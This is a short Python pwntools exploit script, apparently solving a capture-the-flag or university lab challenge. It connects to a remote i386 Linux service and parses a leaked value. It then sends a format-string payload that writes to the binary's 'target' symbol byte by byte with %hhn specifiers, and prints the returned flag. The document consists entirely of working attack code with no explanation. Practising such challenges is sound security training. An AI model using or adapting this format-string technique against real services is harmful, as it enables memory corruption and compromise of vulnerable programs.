#!/usr/bin/env python
from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 10096

context.arch = "i386"
context.os = "linux"

e = ELF("bin")
SYM = e.symbols["target"]

s = remote(SERVER, PORT)
L = s.recvline()
N = int(L[L.index("0x"):], 16)

PTR = [p32(SYM + i) for i in range(4)]
POS = [(7 + i) for i in range(4)]
PADD = [((N >> (8 * i)) & 0xFF) for i in range(4)]

DATA = ""
for p in PTR:
    DATA += p

PADD[3] += 256 - PADD[2]
PADD[2] += 256 - PADD[1]
PADD[1] += 256 - PADD[0]
PADD[0] += 256 - len(DATA)

for p in zip(PADD, POS):
    DATA += "%{}x".format(p[0]) + "%{}$hhn".format(p[1])

s.sendline(DATA)
print(s.recvuntil("}"))
s.close()
